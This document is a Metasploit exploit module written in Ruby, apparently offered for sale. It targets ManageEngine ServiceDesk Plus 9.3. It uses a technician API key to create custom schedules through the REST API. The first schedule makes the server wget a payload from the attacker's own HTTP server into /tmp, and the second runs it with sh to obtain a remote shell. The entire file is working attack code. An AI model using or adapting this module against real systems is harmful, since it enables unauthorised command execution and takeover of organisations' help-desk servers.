##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'ManageEngine ServiceDesk Plus Custom Schedule Command Execution',
                      'Description' => %q{
    This module exploits intended administrative functionality in the ServiceDesk Plus enterprise application.

    ServiceDesk Plus 9.3 ships with an ability for administrative users to define custom schedules which can
    run local scripts or commands. This module exploits this functionality in order to gain a remote  shell
    as the user of the web service.

    Categories: Enterprise, Command Execution

    Price: 7

    Video: https://asciinema.org/a/igPv4d4QVQ3BV7xl5TiUW9Psl

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework
                      },
                        'Author' =>
                      [
                      ],
                      'License' => 'VolatileMinds',
                      'References' =>
                      [
                      ],
                      'Privileged' => false,
                      'Platform'   => ['linux', 'unix'],
                      'Arch'       => ARCH_CMD,
                      'Payload'    =>
                      {
                        'BadChars' => "&\n=+%\"'",
                      },
                      'Targets' =>
                      [
                        [ 'Linux', { } ],
                      ],
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => ''))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, "Base application path", '/']),
        OptString.new('TECHNICIAN_KEY', [ true, "The TECHNICIAN_API key to use", nil]),
      ], self.class)
  end

  def on_request_uri(cli, request)
    print_good("Sending payload")
    send_response(cli, payload.encoded)
    @sent = true
  end

  def exploit
    @sent = false

    uri = Rex::Text.rand_text_alpha(8)
    start_service({'Uri' => {
      'Proc' => Proc.new {|cli, req|
        on_request_uri(cli, req)
      },
      'Path' => "/#{uri}"
    }})

    input_data = %Q{
{"custom_schedules":{"is_enabled":true,"description":"","executor_type":"script","is_periodic":true,"interval_type":"hours","interval_value":"1","executor":"wget http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{uri} -O /tmp/#{uri}","name":"#{Rex::Text.rand_text_alpha(8)}","start_time":{"value":"#{((Time.now+11).to_f * 1000).to_i}"}}}
    }
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/api/v3/custom_schedules'),
      'method' => 'POST',
      'headers' => {
        'TECHNICIAN_KEY' => datastore['TECHNICIAN_KEY']
      },
      'vars_post' => {
        'INPUT_DATA' => input_data
      }
    })

    res = JSON.parse(res.body)

    if res['response_status']['status'] != 'success'
      fail_with(Failure::Unknown, "Couldn't create a custom schedule with the given user credentials")
    end

    while !@sent
      select(nil, nil, nil, 5)
    end

    input_data = %Q{
{"custom_schedules":{"is_enabled":true,"description":"","executor_type":"script","is_periodic":true,"interval_type":"hours","interval_value":"1","executor":"sh /tmp/#{uri}","name":"#{Rex::Text.rand_text_alpha(8)}","start_time":{"value":"#{((Time.now+11).to_f * 1000).to_i}"}}}
    }

    stop_service

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/api/v3/custom_schedules'),
      'method' => 'POST',
      'headers' => {
        'TECHNICIAN_KEY' => datastore['TECHNICIAN_KEY']
      },
      'vars_post' => {
        'INPUT_DATA' => input_data
      }
    })

    i = 0
    @done = false
    while !@done && i < 30
      select(nil, nil, nil, 5)
      i = i + 1
    end

  end

  def on_new_session(session)
    @done = true
  end
end
